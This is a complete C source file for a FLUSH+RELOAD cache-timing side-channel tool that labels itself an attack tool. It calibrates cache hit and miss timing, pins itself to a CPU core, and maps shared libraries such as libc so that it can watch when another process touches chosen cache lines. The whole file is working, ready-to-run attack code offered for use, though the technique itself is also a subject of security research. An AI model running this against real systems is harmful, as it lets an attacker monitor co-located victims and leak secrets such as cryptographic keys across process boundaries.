/*
 * FLUSH+RELOAD Side-Channel Attack Implementation
 * 
 * Features:
 *   - Auto-calibration for hit/miss threshold
 *   - Shared library targeting via mmap
 *   - CPU affinity pinning
 *   - Memory fences for accurate timing
 *   - Multiple output modes (CSV, stats, realtime, calibration)
 * 
 * Build: make release
 * Usage: ./flush_reload [iterations] [threshold] [mode] [target_lib] [offset]
 * 
 * Arguments:
 *   iterations  - Number of probe iterations (default: 100000)
 *   threshold   - Cache hit/miss threshold in cycles (0 = auto-calibrate)
 *   mode        - Output mode:
 *                   0 = CSV output (iter,cycles,hit)
 *                   1 = Statistics only
 *                   2 = Calibration mode (find threshold and exit)
 *                   3 = Realtime monitoring (print hits only)
 *   target_lib  - Path to shared library to probe (empty = local buffer)
 *   offset      - Hex offset within library
 * 
 * Environment:
 *   PIN_CPU     - CPU core to pin to (optional)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <x86intrin.h>

/* ==========================================================================
 * Configuration
 * ========================================================================== */

#define DEFAULT_ITERATIONS 100000
#define DEFAULT_THRESHOLD  150
#define CALIBRATION_SAMPLES 5000
#define CACHE_LINE_SIZE    64
#define PAGE_SIZE          4096

/* Output modes */
#define MODE_CSV       0
#define MODE_STATS     1
#define MODE_CALIBRATE 2
#define MODE_REALTIME  3

/* ==========================================================================
 * Global State
 * ========================================================================== */

/* Local probe buffer (page-aligned) */
static unsigned char probe_buffer[PAGE_SIZE] __attribute__((aligned(4096)));

/* Target address for probing */
static volatile unsigned char *g_target = NULL;

/* Mapped library info */
static void *g_mapped_lib = NULL;
static size_t g_mapped_size = 0;

/* Statistics */
static uint64_t g_total_hits = 0;
static uint64_t g_total_misses = 0;
static uint64_t g_min_cycles = UINT64_MAX;
static uint64_t g_max_cycles = 0;
static uint64_t g_sum_cycles = 0;

/* ==========================================================================
 * Timing Primitives with Proper Serialization
 * ========================================================================== */

/*
 * Read timestamp counter with full serialization.
 * RDTSCP waits for all previous instructions to complete and
 * returns the processor ID in ecx (which we discard).
 */
static inline uint64_t rdtscp_start(void)
{
    uint32_t aux;
    uint64_t tsc;
    
    /* Serialize: ensure all prior instructions complete */
    _mm_mfence();
    _mm_lfence();
    
    tsc = __rdtscp(&aux);
    
    return tsc;
}

static inline uint64_t rdtscp_end(void)
{
    uint32_t aux;
    uint64_t tsc;
    
    /* Ensure memory access completes before reading TSC */
    _mm_lfence();
    
    tsc = __rdtscp(&aux);
    
    /* Final fence for consistency */
    _mm_lfence();
    
    return tsc;
}

/*
 * Flush a cache line from all cache levels.
 */
static inline void clflush(volatile void *addr)
{
    _mm_mfence();
    _mm_clflush((void *)addr);
    _mm_mfence();
}

/*
 * Memory access (load).
 */
static inline void maccess(volatile void *addr)
{
    *(volatile unsigned char *)addr;
}

/* ==========================================================================
 * Probe Functions
 * ========================================================================== */

/*
 * FLUSH+RELOAD probe:
 *   1. Flush the target address from cache
 *   2. Wait briefly for flush to complete
 *   3. Time a reload of the address
 *   4. Return cycle count
 */
static uint64_t flush_reload_probe(volatile void *addr)
{
    uint64_t start, end;
    
    /* Flush */
    clflush(addr);
    
    /* Small delay to ensure flush propagates */
    for (volatile int i = 0; i < 30; i++) { }
    
    /* Time the reload */
    start = rdtscp_start();
    maccess(addr);
    end = rdtscp_end();
    
    return (end - start);
}

/*
 * Reload-only probe (for monitoring victim activity):
 *   1. Time a reload
 *   2. Flush for next iteration
 */
static uint64_t reload_probe(volatile void *addr)
{
    uint64_t start, end;
    
    start = rdtscp_start();
    maccess(addr);
    end = rdtscp_end();
    
    /* Flush for next iteration */
    clflush(addr);
    
    return (end - start);
}

/* ==========================================================================
 * Calibration
 * ========================================================================== */

typedef struct {
    uint64_t hit_mean;
    uint64_t hit_min;
    uint64_t hit_max;
    uint64_t miss_mean;
    uint64_t miss_min;
    uint64_t miss_max;
    uint64_t threshold;
} CalibrationResult;

/*
 * Calibrate hit/miss threshold by measuring:
 *   - Cache hits: access, then access again (data in cache)
 *   - Cache misses: flush, then access (data not in cache)
 */
static CalibrationResult calibrate(volatile void *addr, int samples)
{
    CalibrationResult result = {0};
    uint64_t *hit_times = malloc(samples * sizeof(uint64_t));
    uint64_t *miss_times = malloc(samples * sizeof(uint64_t));
    
    if (!hit_times || !miss_times) {
        fprintf(stderr, "ERROR: calibration malloc failed\n");
        exit(1);
    }
    
    /* Warm up */
    for (int i = 0; i < 100; i++) {
        maccess(addr);
        clflush(addr);
    }
    
    /* Measure cache HITS: access twice in a row */
    for (int i = 0; i < samples; i++) {
        maccess(addr);  /* Bring into cache */
        _mm_mfence();
        
        uint64_t start = rdtscp_start();
        maccess(addr);  /* Should hit */
        uint64_t end = rdtscp_end();
        
        hit_times[i] = end - start;
        
        /* Occasionally flush to reset state */
        if (i % 50 == 0) {
            clflush(addr);
            for (volatile int j = 0; j < 100; j++) { }
            maccess(addr);
        }
    }
    
    /* Measure cache MISSES: flush then access */
    for (int i = 0; i < samples; i++) {
        clflush(addr);
        _mm_mfence();
        
        /* Ensure flush completes */
        for (volatile int j = 0; j < 30; j++) { }
        
        uint64_t start = rdtscp_start();
        maccess(addr);  /* Should miss */
        uint64_t end = rdtscp_end();
        
        miss_times[i] = end - start;
    }
    
    /* Compute statistics */
    uint64_t hit_sum = 0, miss_sum = 0;
    result.hit_min = UINT64_MAX;
    result.hit_max = 0;
    result.miss_min = UINT64_MAX;
    result.miss_max = 0;
    
    for (int i = 0; i < samples; i++) {
        hit_sum += hit_times[i];
        if (hit_times[i] < result.hit_min) result.hit_min = hit_times[i];
        if (hit_times[i] > result.hit_max) result.hit_max = hit_times[i];
        
        miss_sum += miss_times[i];
        if (miss_times[i] < result.miss_min) result.miss_min = miss_times[i];
        if (miss_times[i] > result.miss_max) result.miss_max = miss_times[i];
    }
    
    result.hit_mean = hit_sum / samples;
    result.miss_mean = miss_sum / samples;
    
    /* Threshold = midpoint between hit and miss means */
    result.threshold = (result.hit_mean + result.miss_mean) / 2;
    
    free(hit_times);
    free(miss_times);
    
    return result;
}

/* ==========================================================================
 * CPU Affinity
 * ========================================================================== */

static int pin_to_cpu(int cpu_id)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_id, &cpuset);
    
    if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
        perror("sched_setaffinity");
        return -1;
    }
    
    fprintf(stderr, "[+] Pinned to CPU %d\n", cpu_id);
    return 0;
}

/* ==========================================================================
 * Shared Library Mapping
 * ========================================================================== */

/*
 * Map a shared library file and return pointer to offset within it.
 * This allows probing addresses that the victim process also has mapped.
 */
static void *map_library(const char *lib_path, size_t offset)
{
    int fd;
    struct stat st;
    void *mapped;
    
    fd = open(lib_path, O_RDONLY);
    if (fd < 0) {
        perror("open library");
        return NULL;
    }
    
    if (fstat(fd, &st) < 0) {
        perror("fstat");
        close(fd);
        return NULL;
    }
    
    g_mapped_size = st.st_size;
    
    /* Map the library read-only */
    mapped = mmap(NULL, g_mapped_size, PROT_READ, MAP_SHARED, fd, 0);
    close(fd);
    
    if (mapped == MAP_FAILED) {
        perror("mmap");
        return NULL;
    }
    
    g_mapped_lib = mapped;
    
    /* Validate offset */
    if (offset >= g_mapped_size) {
        fprintf(stderr, "ERROR: offset 0x%lx exceeds library size 0x%lx\n",
                offset, g_mapped_size);
        munmap(mapped, g_mapped_size);
        return NULL;
    }
    
    fprintf(stderr, "[+] Mapped %s (%lu bytes) at %p\n", 
            lib_path, g_mapped_size, mapped);
    fprintf(stderr, "[+] Target offset: 0x%lx -> %p\n", 
            offset, (void *)((char *)mapped + offset));
    
    return (void *)((char *)mapped + offset);
}

static void unmap_library(void)
{
    if (g_mapped_lib) {
        munmap(g_mapped_lib, g_mapped_size);
        g_mapped_lib = NULL;
    }
}

/* ==========================================================================
 * Main Attack Modes
 * ========================================================================== */

static void run_csv_mode(int iterations, uint64_t threshold)
{
    printf("iter,cycles,hit\n");
    
    for (int i = 0; i < iterations; i++) {
        uint64_t cycles = reload_probe(g_target);
        int hit = (cycles < threshold) ? 1 : 0;
        
        /* Update stats */
        if (hit) g_total_hits++;
        else g_total_misses++;
        
        if (cycles < g_min_cycles) g_min_cycles = cycles;
        if (cycles > g_max_cycles) g_max_cycles = cycles;
        g_sum_cycles += cycles;
        
        printf("%d,%lu,%d\n", i, (unsigned long)cycles, hit);
        
        /* Small delay between probes */
        for (volatile int j = 0; j < 20; j++) { }
    }
}

static void run_stats_mode(int iterations, uint64_t threshold)
{
    fprintf(stderr, "[+] Running %d iterations (stats mode)...\n", iterations);
    
    for (int i = 0; i < iterations; i++) {
        uint64_t cycles = reload_probe(g_target);
        int hit = (cycles < threshold) ? 1 : 0;
        
        if (hit) g_total_hits++;
        else g_total_misses++;
        
        if (cycles < g_min_cycles) g_min_cycles = cycles;
        if (cycles > g_max_cycles) g_max_cycles = cycles;
        g_sum_cycles += cycles;
        
        /* Progress indicator */
        if ((i + 1) % 10000 == 0) {
            fprintf(stderr, "  Progress: %d/%d\r", i + 1, iterations);
        }
        
        for (volatile int j = 0; j < 20; j++) { }
    }
    
    fprintf(stderr, "\n");
    
    /* Print statistics */
    printf("=== FLUSH+RELOAD STATISTICS ===\n");
    printf("Iterations: %d\n", iterations);
    printf("Threshold:  %lu cycles\n", (unsigned long)threshold);
    printf("Hits:       %lu (%.2f%%)\n", 
           (unsigned long)g_total_hits, 
           100.0 * g_total_hits / iterations);
    printf("Misses:     %lu (%.2f%%)\n", 
           (unsigned long)g_total_misses,
           100.0 * g_total_misses / iterations);
    printf("Min cycles: %lu\n", (unsigned long)g_min_cycles);
    printf("Max cycles: %lu\n", (unsigned long)g_max_cycles);
    printf("Avg cycles: %.2f\n", (double)g_sum_cycles / iterations);
}

static void run_calibration_mode(void)
{
    fprintf(stderr, "[+] Running calibration (%d samples)...\n", CALIBRATION_SAMPLES);
    
    CalibrationResult cal = calibrate(g_target, CALIBRATION_SAMPLES);
    
    printf("=== FLUSH+RELOAD CALIBRATION ===\n");
    printf("Measuring cache hit/miss timing...\n");
    printf("Cache HIT  (mean): %lu cycles [min=%lu, max=%lu]\n",
           (unsigned long)cal.hit_mean,
           (unsigned long)cal.hit_min,
           (unsigned long)cal.hit_max);
    printf("Cache MISS (mean): %lu cycles [min=%lu, max=%lu]\n",
           (unsigned long)cal.miss_mean,
           (unsigned long)cal.miss_min,
           (unsigned long)cal.miss_max);
    printf("Selected threshold: %lu cycles\n", (unsigned long)cal.threshold);
    printf("Separation ratio: %.2fx\n", 
           (double)cal.miss_mean / cal.hit_mean);
    
    if (cal.hit_max >= cal.miss_min) {
        printf("WARNING: Hit/miss distributions overlap! Attack may be noisy.\n");
    } else {
        printf("Good separation - attack should be effective.\n");
    }
}

static void run_realtime_mode(int iterations, uint64_t threshold)
{
    fprintf(stderr, "[+] Realtime monitoring (threshold=%lu, press Ctrl+C to stop)\n",
            (unsigned long)threshold);
    
    for (int i = 0; i < iterations; i++) {
        uint64_t cycles = reload_probe(g_target);
        int hit = (cycles < threshold) ? 1 : 0;
        
        if (hit) {
            g_total_hits++;
            printf("[%d] HIT  %lu cycles\n", i, (unsigned long)cycles);
        } else {
            g_total_misses++;
        }
        
        /* Slower polling for realtime mode */
        for (volatile int j = 0; j < 100; j++) { }
    }
    
    printf("\n=== Summary ===\n");
    printf("Hits: %lu, Misses: %lu\n", 
           (unsigned long)g_total_hits, 
           (unsigned long)g_total_misses);
}

/* ==========================================================================
 * Usage and Main
 * ========================================================================== */

static void print_usage(const char *prog)
{
    fprintf(stderr, "FLUSH+RELOAD Side-Channel Attack Tool\n\n");
    fprintf(stderr, "Usage: %s [iterations] [threshold] [mode] [target_lib] [offset]\n\n", prog);
    fprintf(stderr, "Arguments:\n");
    fprintf(stderr, "  iterations   Number of probe iterations (default: %d)\n", DEFAULT_ITERATIONS);
    fprintf(stderr, "  threshold    Hit/miss threshold in cycles (0 = auto-calibrate)\n");
    fprintf(stderr, "  mode         Output mode:\n");
    fprintf(stderr, "                 0 = CSV output: iter,cycles,hit (default)\n");
    fprintf(stderr, "                 1 = Statistics summary only\n");
    fprintf(stderr, "                 2 = Calibration mode\n");
    fprintf(stderr, "                 3 = Realtime monitoring\n");
    fprintf(stderr, "  target_lib   Path to shared library (optional, empty = local buffer)\n");
    fprintf(stderr, "  offset       Hex offset within library (default: 0)\n\n");
    fprintf(stderr, "Environment:\n");
    fprintf(stderr, "  PIN_CPU      CPU core to pin process to\n\n");
    fprintf(stderr, "Examples:\n");
    fprintf(stderr, "  %s 100000 0 2                     # Calibration\n", prog);
    fprintf(stderr, "  %s 100000 150 0 > results.csv    # CSV output\n", prog);
    fprintf(stderr, "  %s 50000 150 1                    # Stats only\n", prog);
    fprintf(stderr, "  %s 10000 150 0 /lib/x86_64-linux-gnu/libc.so.6 0x1000\n", prog);
}

int main(int argc, char **argv)
{
    int iterations = DEFAULT_ITERATIONS;
    uint64_t threshold = 0;  /* 0 = auto-calibrate */
    int mode = MODE_CSV;
    const char *target_lib = NULL;
    size_t offset = 0;
    
    /* Parse command line arguments */
    if (argc > 1) {
        if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0) {
            print_usage(argv[0]);
            return 0;
        }
        iterations = atoi(argv[1]);
        if (iterations <= 0) iterations = DEFAULT_ITERATIONS;
    }
    
    if (argc > 2) {
        threshold = strtoull(argv[2], NULL, 10);
    }
    
    if (argc > 3) {
        mode = atoi(argv[3]);
        if (mode < 0 || mode > 3) mode = MODE_CSV;
    }
    
    if (argc > 4 && strlen(argv[4]) > 0) {
        target_lib = argv[4];
    }
    
    if (argc > 5) {
        offset = strtoull(argv[5], NULL, 16);  /* Hex offset */
    }
    
    /* CPU pinning from environment */
    char *pin_cpu_env = getenv("PIN_CPU");
    if (pin_cpu_env && strlen(pin_cpu_env) > 0) {
        int cpu = atoi(pin_cpu_env);
        pin_to_cpu(cpu);
    }
    
    /* Setup target address */
    if (target_lib) {
        void *addr = map_library(target_lib, offset);
        if (!addr) {
            fprintf(stderr, "WARNING: Failed to map library, using local buffer\n");
            g_target = &probe_buffer[0];
        } else {
            g_target = (volatile unsigned char *)addr;
        }
    } else {
        /* Use local probe buffer */
        memset(probe_buffer, 0x42, sizeof(probe_buffer));
        g_target = &probe_buffer[0];
        fprintf(stderr, "[+] Using local probe buffer at %p\n", (void *)g_target);
    }
    
    /* Auto-calibrate if threshold is 0 and not in calibration mode */
    if (threshold == 0 && mode != MODE_CALIBRATE) {
        fprintf(stderr, "[+] Auto-calibrating threshold...\n");
        CalibrationResult cal = calibrate(g_target, CALIBRATION_SAMPLES);
        threshold = cal.threshold;
        fprintf(stderr, "[+] Calibrated threshold: %lu cycles (hit=%lu, miss=%lu)\n",
                (unsigned long)threshold,
                (unsigned long)cal.hit_mean,
                (unsigned long)cal.miss_mean);
    }
    
    /* Print startup info */
    fprintf(stderr, "[+] FLUSH+RELOAD starting\n");
    fprintf(stderr, "    Iterations: %d\n", iterations);
    fprintf(stderr, "    Threshold:  %lu cycles\n", (unsigned long)threshold);
    fprintf(stderr, "    Mode:       %d (%s)\n", mode,
            mode == 0 ? "CSV" : mode == 1 ? "Stats" : mode == 2 ? "Calibrate" : "Realtime");
    fprintf(stderr, "    Target:     %p\n", (void *)g_target);
    
    /* Run selected mode */
    switch (mode) {
        case MODE_CSV:
            run_csv_mode(iterations, threshold);
            break;
        case MODE_STATS:
            run_stats_mode(iterations, threshold);
            break;
        case MODE_CALIBRATE:
            run_calibration_mode();
            break;
        case MODE_REALTIME:
            run_realtime_mode(iterations, threshold);
            break;
        default:
            fprintf(stderr, "ERROR: Invalid mode %d\n", mode);
            return 1;
    }
    
    /* Cleanup */
    unmap_library();
    
    return 0;
}
